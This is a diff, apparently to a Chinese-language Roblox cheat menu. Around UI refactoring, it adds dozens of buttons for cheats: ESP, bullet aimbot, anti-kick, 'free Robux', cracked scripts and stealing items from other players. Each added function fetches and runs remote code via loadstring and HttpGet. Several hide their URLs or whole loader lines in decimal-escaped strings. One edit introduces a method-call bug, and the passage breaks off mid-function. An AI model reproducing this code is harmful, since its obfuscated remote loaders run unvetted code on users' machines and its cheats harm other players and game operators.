@@ -55,12 +55,14 @@ local function loadScript()
     Shadow.Parent = MainFrame
     
     -- 增强圆角效果
-    local MainCorner = Instance.new("UICorner", MainFrame)
+    local MainCorner = Instance.new("UICorner")
     MainCorner.CornerRadius = UDim.new(0, 11)
+    MainCorner.Parent = MainFrame
     
-    local MainStroke = Instance.new("UIStroke", MainFrame)
+    local MainStroke = Instance.new("UIStroke")
     MainStroke.Color = Color3.fromRGB(0, 150, 255)
     MainStroke.Thickness = 1.3
+    MainStroke.Parent = MainFrame
     
     -- 背景图片（保留原本UI背景）
     local BackgroundImage = Instance.new("ImageLabel")
@@ -70,7 +72,9 @@ local function loadScript()
     BackgroundImage.ImageTransparency = 0.3
     BackgroundImage.ScaleType = Enum.ScaleType.Crop
     BackgroundImage.ZIndex = 1
-    Instance.new("UICorner", BackgroundImage).CornerRadius = UDim.new(0, 11)
+    local BackgroundCorner = Instance.new("UICorner")
+    BackgroundCorner.CornerRadius = UDim.new(0, 11)
+    BackgroundCorner.Parent = BackgroundImage
     BackgroundImage.Parent = MainFrame
     
     -- 标题栏
@@ -80,7 +84,9 @@ local function loadScript()
     TitleBar.BackgroundTransparency = 0.2
     TitleBar.BorderSizePixel = 0
     TitleBar.ZIndex = 5
-    Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 11)
+    local TitleBarCorner = Instance.new("UICorner")
+    TitleBarCorner.CornerRadius = UDim.new(0, 11)
+    TitleBarCorner.Parent = TitleBar
     TitleBar.Parent = MainFrame
     
     local TitleLabel = Instance.new("TextLabel")
@@ -106,7 +112,9 @@ local function loadScript()
     MinimizeButton.TextSize = 16
     MinimizeButton.Font = Enum.Font.GothamBold
     MinimizeButton.ZIndex = 6
-    Instance.new("UICorner", MinimizeButton).CornerRadius = UDim.new(0, 5.3)
+    local MinimizeCorner = Instance.new("UICorner")
+    MinimizeCorner.CornerRadius = UDim.new(0, 5.3)
+    MinimizeCorner.Parent = MinimizeButton
     MinimizeButton.Parent = TitleBar
 
     local CloseButton = Instance.new("TextButton")
@@ -119,7 +127,9 @@ local function loadScript()
     CloseButton.TextSize = 14
     CloseButton.Font = Enum.Font.GothamBold
     CloseButton.ZIndex = 6
-    Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(0, 5.3)
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 5.3)
+    CloseCorner.Parent = CloseButton
     CloseButton.Parent = TitleBar
     
     -- 选项卡区域（左侧）- 修改为可滚动
@@ -129,7 +139,9 @@ local function loadScript()
     TabFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
     TabFrame.BackgroundTransparency = 0.2
     TabFrame.ZIndex = 3
-    Instance.new("UICorner", TabFrame).CornerRadius = UDim.new(0, 11)
+    local TabFrameCorner = Instance.new("UICorner")
+    TabFrameCorner.CornerRadius = UDim.new(0, 11)
+    TabFrameCorner.Parent = TabFrame
     TabFrame.Parent = MainFrame
     
     -- 主内容区域（右侧）
@@ -144,7 +156,8 @@ local function loadScript()
     local Tabs = {
         "公告", "基础功能", "移动功能", "玩家交互", "外观功能", "世界功能", 
         "FE功能", "黑洞功能", "其他脚本", "doors", "偷走脑红", "种植花园", 
-        "其他脚本整合", "免费r币", "死亡之死", "被遗弃", "无敌少侠飞行"
+        "其他脚本整合", "免费r币", "死亡之死", "被遗弃", "无敌少侠飞行",
+        "俄亥俄州", "画我"  -- 新增选项卡
     }
     local TabButtons = {}
     local CurrentTab = "公告"
@@ -162,13 +175,16 @@ local function loadScript()
     TabScrolling.ZIndex = 4
     TabScrolling.Parent = TabFrame
     
-    local TabLayout = Instance.new("UIListLayout", TabScrolling)
+    local TabLayout = Instance.new("UIListLayout")
     TabLayout.Padding = UDim.new(0, 3.3)
+    TabLayout.Parent = TabScrolling
     
-    Instance.new("UIPadding", TabScrolling).PaddingTop = UDim.new(0, 6.7)
-    Instance.new("UIPadding", TabScrolling).PaddingLeft = UDim.new(0, 3.3)
-    Instance.new("UIPadding", TabScrolling).PaddingRight = UDim.new(0, 3.3)
-    Instance.new("UIPadding", TabScrolling).PaddingBottom = UDim.new(0, 6.7)
+    local TabPadding = Instance.new("UIPadding")
+    TabPadding.PaddingTop = UDim.new(0, 6.7)
+    TabPadding.PaddingLeft = UDim.new(0, 3.3)
+    TabPadding.PaddingRight = UDim.new(0, 3.3)
+    TabPadding.PaddingBottom = UDim.new(0, 6.7)
+    TabPadding.Parent = TabScrolling
 
     for i, tabName in ipairs(Tabs) do
         local tabButton = Instance.new("TextButton")
@@ -181,7 +197,9 @@ local function loadScript()
         tabButton.Font = Enum.Font.Gotham
         tabButton.ZIndex = 5
         tabButton.AutoButtonColor = false
-        Instance.new("UICorner", tabButton).CornerRadius = UDim.new(0, 6.7)
+        local TabButtonCorner = Instance.new("UICorner")
+        TabButtonCorner.CornerRadius = UDim.new(0, 6.7)
+        TabButtonCorner.Parent = tabButton
         tabButton.Parent = TabScrolling
         TabButtons[tabName] = tabButton
     end
@@ -199,13 +217,16 @@ local function loadScript()
     ContentScrolling.Parent = MainContent
     
     -- 使用UIListLayout
-    local ContentList = Instance.new("UIListLayout", ContentScrolling)
+    local ContentList = Instance.new("UIListLayout")
     ContentList.Padding = UDim.new(0, 5.3)
     ContentList.SortOrder = Enum.SortOrder.LayoutOrder
+    ContentList.Parent = ContentScrolling
     
-    Instance.new("UIPadding", ContentScrolling).PaddingLeft = UDim.new(0, 3.3)
-    Instance.new("UIPadding", ContentScrolling).PaddingRight = UDim.new(0, 3.3)
-    Instance.new("UIPadding", ContentScrolling).PaddingTop = UDim.new(0, 3.3)
+    local ContentPadding = Instance.new("UIPadding")
+    ContentPadding.PaddingLeft = UDim.new(0, 3.3)
+    ContentPadding.PaddingRight = UDim.new(0, 3.3)
+    ContentPadding.PaddingTop = UDim.new(0, 3.3)
+    ContentPadding.Parent = ContentScrolling
     
     -- 创建按钮函数（单列按钮）
     local function createButton(text, description)
@@ -225,9 +246,12 @@ local function loadScript()
         button.AutoButtonColor = false
         button.ZIndex = 5
         button.TextWrapped = true
-        Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
-        local buttonStroke = Instance.new("UIStroke", button)
+        local ButtonCorner = Instance.new("UICorner")
+        ButtonCorner.CornerRadius = UDim.new(0, 8)
+        ButtonCorner.Parent = button
+        local buttonStroke = Instance.new("UIStroke")
         buttonStroke.Color = Color3.fromRGB(100, 100, 200)
+        buttonStroke.Parent = button
         button.Parent = buttonFrame
         
         if description then
@@ -243,8 +267,12 @@ local function loadScript()
                 tooltip.TextWrapped = true
                 tooltip.ZIndex = 100
                 tooltip.Visible = false
-                Instance.new("UICorner", tooltip).CornerRadius = UDim.new(0, 5.3)
-                Instance.new("UIStroke", tooltip).Color = Color3.fromRGB(0, 150, 255)
+                local TooltipCorner = Instance.new("UICorner")
+                TooltipCorner.CornerRadius = UDim.new(0, 5.3)
+                TooltipCorner.Parent = tooltip
+                local TooltipStroke = Instance.new("UIStroke")
+                TooltipStroke.Color = Color3.fromRGB(0, 150, 255)
+                TooltipStroke.Parent = tooltip
                 tooltip.Parent = buttonFrame
                 
                 tooltip.Visible = true
@@ -293,7 +321,8 @@ local function loadScript()
             {name = "CollisionBoxButton", text = "显示碰撞箱 [关闭]", desc = "显示物体碰撞箱"},
             {name = "WalkAirButton", text = "踏空行走", desc = "加载踏空行走脚本"},
             {name = "PlayerESPButton", text = "透视玩家 [关闭]", desc = "透视显示其他玩家轮廓"},
-            {name = "BulletTrackButton", text = "子弹追踪 [关闭]", desc = "子弹自动追踪最近玩家"}
+            {name = "BulletTrackButton", text = "子弹追踪 [关闭]", desc = "子弹自动追踪最近玩家"},
+            {name = "ConduitCenterButton", text = "导管中心", desc = "加载导管中心脚本"}  -- 新增
         },
         ["移动功能"] = {
             {name = "SpinButton", text = "人物旋转 [关闭]", desc = "让人物持续旋转"},
@@ -348,7 +377,39 @@ local function loadScript()
             {name = "FEVRButton", text = "FE vr", desc = "加载FE vr脚本"},
             {name = "FE1x1x1x1Button", text = "FE魔王1x1x1x1", desc = "加载FE魔王1x1x1x1脚本"},
             {name = "FEHotlineRifleButton", text = "FE热线枪膛", desc = "加载FE热线枪膛脚本"},
-            {name = "FEIronFistButton", text = "FE铁拳", desc = "加载FE铁拳脚本"}
+            {name = "FEIronFistButton", text = "FE铁拳", desc = "加载FE铁拳脚本"},
+            {name = "FEScriptV2Button", text = "FE脚本整合v2", desc = "加载FE脚本整合v2脚本"},  -- 新增
+            {name = "FEGatlingButton", text = "FE加特林", desc = "加载FE加特林脚本"},  -- 新增
+            {name = "FEPunchButton", text = "FE拳击", desc = "加载FE拳击脚本"},  -- 新增
+            {name = "FEMotorcycleButton", text = "FE摩托车", desc = "加载FE摩托车脚本"},  -- 新增
+            {name = "FEBanHammerButton", text = "FE封禁之锤", desc = "加载FE封禁之锤脚本"},  -- 新增
+            {name = "FEGatling2Button", text = "FE加特林2", desc = "加载FE加特林2脚本"},  -- 新增
+            {name = "FENoriButton", text = "FE诺丽", desc = "加载FE诺丽脚本"},  -- 新增
+            {name = "FEGuest666Button", text = "FE访客666变身", desc = "加载FE访客666变身脚本"},  -- 新增
+            {name = "FEKeyboardButton", text = "FE键盘变身", desc = "加载FE键盘变身脚本"},  -- 新增
+            {name = "FEScriptV3Button", text = "FE整合v3", desc = "加载FE整合v3脚本"},  -- 新增
+            {name = "FEWallJumpButton", text = "FE自动跳墙", desc = "加载FE自动跳墙脚本"},  -- 新增
+            {name = "FEFightAnimButton", text = "FE格斗动作", desc = "加载FE格斗动作脚本"},  -- 新增
+            {name = "FER6NoHeadButton", text = "FE R6无头", desc = "加载FE R6无头脚本"},  -- 新增
+            {name = "FER15NoHeadButton", text = "FE R15无头", desc = "加载FE R15无头脚本"},  -- 新增
+            {name = "FEMrSleepButton", text = "FE Mr.睡不醒", desc = "加载FE Mr.睡不醒脚本"},  -- 新增
+            {name = "FELaserGunButton", text = "FE激光炮", desc = "加载FE激光炮脚本"},  -- 新增
+            {name = "FESpiderButton", text = "FE蜘蛛", desc = "加载FE蜘蛛脚本"},  -- 新增
+            {name = "FER15GladiatorButton", text = "FE R15角斗士", desc = "加载FE R15角斗士脚本"},  -- 新增
+            {name = "FEZombieButton", text = "FE僵尸", desc = "加载FE僵尸脚本"},  -- 新增
+            {name = "FELaserButton", text = "FE激光", desc = "加载FE激光脚本"},  -- 新增
+            {name = "FEBaboonButton", text = "FE狒狒", desc = "加载FE狒狒脚本"},  -- 新增
+            {name = "FECrewButton", text = "FE船员", desc = "加载FE船员脚本"},  -- 新增
+            {name = "FECreeperButton", text = "FE苦力怕", desc = "加载FE苦力怕脚本"},  -- 新增
+            {name = "FENoSkinSnakeButton", text = "FE不要饰品的蛇", desc = "加载FE不要饰品的蛇脚本"},  -- 新增
+            {name = "FESupermanButton", text = "FE超人", desc = "加载FE超人脚本"},  -- 新增
+            {name = "FEAvengerButton", text = "FE复仇者", desc = "加载FE复仇者脚本"},  -- 新增
+            {name = "FEDarkCreatureButton", text = "FE黑暗生物", desc = "加载FE黑暗生物脚本"},  -- 新增
+            {name = "FEOfficialHammerButton", text = "FE官方之锤", desc = "加载FE官方之锤脚本"},  -- 新增
+            {name = "FEAntiKickButton", text = "FE 防踢", desc = "加载FE防踢脚本"},  -- 新增
+            {name = "FEN00kla5KMenuButton", text = "FE N00kla5K菜单", desc = "加载FE N00kla5K菜单脚本"},  -- 新增
+            {name = "FEAC6MusicVulButton", text = "FE AC6漏洞放音乐", desc = "加载FE AC6漏洞放音乐脚本"},  -- 新增
+            {name = "FEHappyHudButton", text = "FE happyhud", desc = "加载FE happyhud脚本"}  -- 新增
         },
         ["黑洞功能"] = {
             {name = "BlackHoleV6Button", text = "黑洞v6", desc = "加载黑洞v6脚本"},
@@ -370,8 +431,6 @@ local function loadScript()
             {name = "FreePrivateServerButton", text = "免费私服", desc = "加载免费私服脚本"},
             {name = "CaodanButton", text = "操蛋", desc = "加载操蛋脚本"},
             {name = "CaodanV1Button", text = "操蛋v1", desc = "加载操蛋v1脚本"},
-            {name = "OhioButton", text = "俄亥俄州脚本", desc = "加载俄亥俄州脚本"},
-            {name = "Ohio2Button", text = "俄亥俄州脚本2", desc = "加载俄亥俄州脚本2"},
             {name = "ThrowFlyButton", text = "甩飞脚本", desc = "加载甩飞脚本"},
             {name = "BeatDogButton", text = "Kenny悦服循环打狗", desc = "加载Kenny悦服循环打狗脚本"},
             {name = "WitherStormButton", text = "凋零风暴", desc = "加载凋零风暴脚本"},
@@ -392,7 +451,8 @@ local function loadScript()
             {name = "WallRunButton", text = "飞檐走壁", desc = "加载飞檐走壁脚本"},
             {name = "NaturalDisasterButton", text = "自然灾害", desc = "加载自然灾害脚本"},
             {name = "MuscleLegendButton", text = "力量传奇", desc = "加载力量传奇脚本"},
-            {name = "MuscleLegendChangeButton", text = "力量传奇改力量", desc = "加载力量传奇改力量脚本"}
+            {name = "MuscleLegendChangeButton", text = "力量传奇改力量", desc = "加载力量传奇改力量脚本"},
+            {name = "PlayForsakenServerButton", text = "在服务器玩被遗弃脚本", desc = "在服务器玩被遗弃脚本"}  -- 新增
         },
         ["doors"] = {
             {name = "DoorsButton", text = "doors", desc = "加载doors脚本"},
@@ -418,7 +478,11 @@ local function loadScript()
             {name = "ScriptCenterButton", text = "脚本中心", desc = "加载脚本中心"},
             {name = "XAScriptCenterButton", text = "xa脚本中心", desc = "加载xa脚本中心"},
             {name = "ChenScriptButton", text = "辰脚本", desc = "加载辰脚本"},
-            {name = "ShaScriptButton", text = "沙脚本", desc = "加载沙脚本"}
+            {name = "ShaScriptButton", text = "沙脚本", desc = "加载沙脚本"},
+            {name = "BSCenterButton", text = "BS中心", desc = "加载BS中心脚本"},  -- 新增
+            {name = "BlackWhiteScriptButton", text = "黑白脚本", desc = "加载黑白脚本"},  -- 新增
+            {name = "ArcticScriptCenterButton", text = "北极脚本中心", desc = "加载北极脚本中心"},  -- 新增
+            {name = "NanningCenterButton", text = "南宁中心", desc = "加载南宁中心脚本"}  -- 新增
         },
         ["免费r币"] = {
             {name = "Free80RButton", text = "免费80r培根独家", desc = "点击获取免费80r币奖励"},
@@ -440,6 +504,18 @@ local function loadScript()
         ["无敌少侠飞行"] = {
             {name = "InvincibleFlyR15Button", text = "无敌少侠飞行r15", desc = "R15角色无敌飞行模式"},
             {name = "InvincibleFlyR6Button", text = "无敌少侠飞行r6", desc = "R6角色无敌飞行模式"}
+        },
+        ["俄亥俄州"] = {  -- 新增选项卡
+            {name = "OhioButton", text = "俄亥俄州脚本", desc = "加载俄亥俄州脚本"},
+            {name = "Ohio2Button", text = "俄亥俄州脚本2", desc = "加载俄亥俄州脚本2"},
+            {name = "Ohio3Button", text = "俄亥俄州脚本3", desc = "加载俄亥俄州脚本3"},
+            {name = "OhioMoneyMachineButton", text = "俄亥俄州捡印钞机", desc = "加载俄亥俄州捡印钞机脚本"},
+            {name = "Ohio4Button", text = "俄亥俄州脚本4", desc = "加载俄亥俄州脚本4"},
+            {name = "XAOhioScriptButton", text = "xa俄亥俄州脚本", desc = "加载xa俄亥俄州脚本"}
+        },
+        ["画我"] = {  -- 新增选项卡
+            {name = "DrawMeScript1Button", text = "画我脚本1", desc = "加载画我脚本1"},
+            {name = "DrawMeScript2Button", text = "画我脚本2", desc = "加载画我脚本2"}
         }
     }
 
@@ -469,13 +545,16 @@ local function loadScript()
     AnnouncementScrolling.ZIndex = 4
     AnnouncementScrolling.Parent = MainContent
     
-    local AnnouncementList = Instance.new("UIListLayout", AnnouncementScrolling)
+    local AnnouncementList = Instance.new("UIListLayout")
     AnnouncementList.Padding = UDim.new(0, 8)
     AnnouncementList.SortOrder = Enum.SortOrder.LayoutOrder
+    AnnouncementList.Parent = AnnouncementScrolling
     
-    Instance.new("UIPadding", AnnouncementScrolling).PaddingLeft = UDim.new(0, 5)
-    Instance.new("UIPadding", AnnouncementScrolling).PaddingRight = UDim.new(0, 5)
-    Instance.new("UIPadding", AnnouncementScrolling).PaddingTop = UDim.new(0, 5)
+    local AnnouncementPadding = Instance.new("UIPadding")
+    AnnouncementPadding.PaddingLeft = UDim.new(0, 5)
+    AnnouncementPadding.PaddingRight = UDim.new(0, 5)
+    AnnouncementPadding.PaddingTop = UDim.new(0, 5)
+    AnnouncementPadding.Parent = AnnouncementScrolling
     
     -- 获取玩家账户年龄
     local playerAge = "未知"
@@ -526,9 +605,12 @@ local function loadScript()
     catImage.Image = "rbxassetid://131184246499429"
     catImage.ScaleType = Enum.ScaleType.Crop
     catImage.ZIndex = 5
-    Instance.new("UICorner", catImage).CornerRadius = UDim.new(0, 8)
-    local catStroke = Instance.new("UIStroke", catImage)
+    local CatImageCorner = Instance.new("UICorner")
+    CatImageCorner.CornerRadius = UDim.new(0, 8)
+    CatImageCorner.Parent = catImage
+    local catStroke = Instance.new("UIStroke")
     catStroke.Color = Color3.fromRGB(100, 100, 200)
+    catStroke.Parent = catImage
     catImage.Parent = catImageFrame
     
     -- 图片底下的文字
@@ -634,8 +716,12 @@ local function loadScript()
         notification.BackgroundColor3 = color
         notification.BackgroundTransparency = 0.2
         notification.ZIndex = 100
-        Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 8)
-        Instance.new("UIStroke", notification).Color = Color3.fromRGB(255, 255, 255)
+        local NotificationCorner = Instance.new("UICorner")
+        NotificationCorner.CornerRadius = UDim.new(0, 8)
+        NotificationCorner.Parent = notification
+        local NotificationStroke = Instance.new("UIStroke")
+        NotificationStroke.Color = Color3.fromRGB(255, 255, 255)
+        NotificationStroke.Parent = notification
         notification.Parent = ScreenGui
         
         local label = Instance.new("TextLabel")
@@ -809,7 +895,7 @@ local function loadScript()
             
             -- 移除碰撞箱
             for _, obj in pairs(Workspace:GetDescendants()) do
-                if obj:IsA("BasePart") and obj:FindFirstChild("BaconCollisionBox") then
+                if obj:IsA("BasePart") and obj.FindFirstChild("BaconCollisionBox") then
                     obj.BaconCollisionBox:Destroy()
                 end
             end
@@ -1128,7 +1214,7 @@ local function loadScript()
 
     local function loadSpeedLegend()
         playClickSound()
-        loadstring(Game:HttpGet("https://pastebin.com/raw/0A4J7V8M"))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/0A4J7V8M", true))()
         showNotification("极速传奇已加载!", Color3.fromRGB(0, 200, 0))
     end
 
@@ -1550,8 +1636,12 @@ print("安全版自然灾害免疫已激活")
         backpackFrame.Active = true
         backpackFrame.Draggable = true
         backpackFrame.ZIndex = 50
-        Instance.new("UICorner", backpackFrame).CornerRadius = UDim.new(0, 10)
-        Instance.new("UIStroke", backpackFrame).Color = Color3.fromRGB(0, 150, 255)
+        local BackpackCorner = Instance.new("UICorner")
+        BackpackCorner.CornerRadius = UDim.new(0, 10)
+        BackpackCorner.Parent = backpackFrame
+        local BackpackStroke = Instance.new("UIStroke")
+        BackpackStroke.Color = Color3.fromRGB(0, 150, 255)
+        BackpackStroke.Parent = backpackFrame
         backpackFrame.Parent = ScreenGui
 
         -- 标题栏
@@ -1561,7 +1651,9 @@ print("安全版自然灾害免疫已激活")
         titleBar.BackgroundTransparency = 0.1
         titleBar.BorderSizePixel = 0
         titleBar.ZIndex = 51
-        Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)
+        local TitleBarCorner2 = Instance.new("UICorner")
+        TitleBarCorner2.CornerRadius = UDim.new(0, 10)
+        TitleBarCorner2.Parent = titleBar
         titleBar.Parent = backpackFrame
 
         local titleLabel = Instance.new("TextLabel")
@@ -1586,7 +1678,9 @@ print("安全版自然灾害免疫已激活")
         closeButton.TextSize = 16
         closeButton.Font = Enum.Font.GothamBold
         closeButton.ZIndex = 52
-        Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 5.3)
+        local CloseButtonCorner2 = Instance.new("UICorner")
+        CloseButtonCorner2.CornerRadius = UDim.new(0, 5.3)
+        CloseButtonCorner2.Parent = closeButton
         closeButton.Parent = titleBar
 
         -- 内容区域
@@ -1601,9 +1695,12 @@ print("安全版自然灾害免疫已激活")
         contentFrame.ZIndex = 51
         contentFrame.Parent = backpackFrame
 
-        local contentLayout = Instance.new("UIListLayout", contentFrame)
+        local contentLayout = Instance.new("UIListLayout")
         contentLayout.Padding = UDim.new(0, 6.7)
-        Instance.new("UIPadding", contentFrame).PaddingTop = UDim.new(0, 3.3)
+        contentLayout.Parent = contentFrame
+        local ContentPadding2 = Instance.new("UIPadding")
+        ContentPadding2.PaddingTop = UDim.new(0, 3.3)
+        ContentPadding2.Parent = contentFrame
 
         -- 获取目标玩家的背包和角色中的工具
         local targetBackpack = selectedPlayer:FindFirstChildOfClass("Backpack")
@@ -1646,8 +1743,12 @@ print("安全版自然灾害免疫已激活")
                 itemFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
                 itemFrame.BackgroundTransparency = 0.3
                 itemFrame.ZIndex = 52
-                Instance.new("UICorner", itemFrame).CornerRadius = UDim.new(0, 6.7)
-                Instance.new("UIStroke", itemFrame).Color = Color3.fromRGB(100, 100, 200)
+                local ItemFrameCorner = Instance.new("UICorner")
+                ItemFrameCorner.CornerRadius = UDim.new(0, 6.7)
+                ItemFrameCorner.Parent = itemFrame
+                local ItemFrameStroke = Instance.new("UIStroke")
+                ItemFrameStroke.Color = Color3.fromRGB(100, 100, 200)
+                ItemFrameStroke.Parent = itemFrame
                 itemFrame.Parent = contentFrame
 
                 local itemName = Instance.new("TextLabel")
@@ -1672,7 +1773,9 @@ print("安全版自然灾害免疫已激活")
                 stealButton.TextSize = 14
                 stealButton.Font = Enum.Font.GothamBold
                 stealButton.ZIndex = 53
-                Instance.new("UICorner", stealButton).CornerRadius = UDim.new(0, 5.3)
+                local StealButtonCorner = Instance.new("UICorner")
+                StealButtonCorner.CornerRadius = UDim.new(0, 5.3)
+                StealButtonCorner.Parent = stealButton
                 stealButton.Parent = itemFrame
 
                 local itemDesc = Instance.new("TextLabel")
@@ -2189,6 +2292,314 @@ print("安全版自然灾害免疫已激活")
         showNotification("俄亥俄州脚本2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
+    -- 俄亥俄州脚本3
+    local function loadOhio3()
+        playClickSound()
+        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\99\114\105\112\116\115\46\118\105\115\117\114\117\115\46\100\101\118\47\111\104\105\111\47\115\111\117\114\99\101"))()
+        showNotification("俄亥俄州脚本3已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 俄亥俄州捡印钞机
+    local function loadOhioMoneyMachine()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/IIIlll1ll1/Cracks/main/AdvancedLogic_Crack.lua"))()
+        showNotification("俄亥俄州捡印钞机已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- BS中心
+    local function loadBSCenter()
+        playClickSound()
+        loadstring(game:HttpGet("https://gitee.com/BS_script/script/raw/master/BS_Script.Luau"))()
+        showNotification("BS中心已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 黑白脚本
+    local function loadBlackWhiteScript()
+        playClickSound()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/黑白脚本加载器'))()
+        showNotification("黑白脚本已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 俄亥俄州脚本4
+    local function loadOhio4()
+        playClickSound()
+        loadstring(game:HttpGet("https://pastebin.com/raw/hkvHeHed",true))()
+        showNotification("俄亥俄州脚本4已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE脚本整合v2
+    local function loadFEScriptV2()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-TVgui-fe-bypass-V2-72662"))()
+        showNotification("FE脚本整合v2已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE加特林
+    local function loadFEGatling()
+        playClickSound()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/e7b408abcb813525d37e9b7a6bf301c9/raw/6421f9000e90e8a4c2ed57052208acbd6f9648dd/Minigun.txt"))()
+        showNotification("FE加特林已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE拳击
+    local function loadFEPunch()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Gale%20Fighter"))()
+        showNotification("FE拳击已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE摩托车
+    local function loadFEMotorcycle()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Motorcycle"))()
+        showNotification("FE摩托车已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE封禁之锤
+    local function loadFEBanHammer()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Ban%20Hammer"))()
+        showNotification("FE封禁之锤已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE加特林2
+    local function loadFEGatling2()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Minigun"))()
+        showNotification("FE加特林2已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE诺丽
+    local function loadFENori()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty0.lua"))()
+        showNotification("FE诺丽已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 北极脚本中心
+    local function loadArcticScriptCenter()
+        playClickSound()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KwARpDxV",true))()
+        showNotification("北极脚本中心已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 画我脚本1
+    local function loadDrawMeScript1()
+        playClickSound()
+        loadstring(game:HttpGet("https://ancestrychanged.fun/loader.lua"))()
+        showNotification("画我脚本1已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 画我脚本2
+    local function loadDrawMeScript2()
+        playClickSound()
+        loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/3387bc2c06c6ab7e0606178d675e0ad46b29427c6a1f81e96a4c9d7a090eb68e/download"))()
+        showNotification("画我脚本2已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 南宁中心
+    local function loadNanningCenter()
+        playClickSound()
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\88\67\87\82\87\110\76\34\41\40\41\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\78\112\86\65\110\119\110\104\34\41\40\41\10")()
+        showNotification("南宁中心已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE访客666变身
+    local function loadFEGuest666()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/My-Scripts/refs/heads/main/Guest%20666.lua"))()
+        showNotification("FE访客666变身已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE键盘变身
+    local function loadFEKeyboard()
+        playClickSound()
+        loadstring(game:HttpGet('https://pastebin.com/raw/bvPbLBrT'))()
+        showNotification("FE键盘变身已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 在服务器玩被遗弃脚本
+    local function loadPlayForsakenServer()
+        playClickSound()
+        loadstring(game:HttpGet("https://pastebin.com/raw/CLwqkVKQ"))()
+        showNotification("在服务器玩被遗弃脚本已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE整合v3
+    local function loadFEScriptV3()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/Genesisloader/main/Script.lua"))()
+        showNotification("FE整合v3已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE自动跳墙
+    local function loadFEWallJump()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/refs/heads/main/Roblox%20WallHop%20V4%20script"))()
+        showNotification("FE自动跳墙已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE格斗动作
+    local function loadFEFightAnim()
+        playClickSound()
+        loadstring(game:HttpGet("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Fighter-Cracked"))()
+        showNotification("FE格斗动作已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE R6无头
+    local function loadFER6NoHead()
+        playClickSound()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Gazer-Ha/Valiant-Ui-Lib-Gazed-/refs/heads/main/Head%20Pack'))()
+        showNotification("FE R6无头已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE R15无头
+    local function loadFER15NoHead()
+        playClickSound()
+        loadstring(game:HttpGet(("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/假无头.lua"),true))()
+        showNotification("FE R15无头已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE Mr.睡不醒
+    local function loadFEMrSleep()
+        playClickSound()
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\102\103\74\105\55\105\101\55\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
+        showNotification("FE Mr.睡不醒已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE激光炮
+    local function loadFELaserGun()
+        playClickSound()
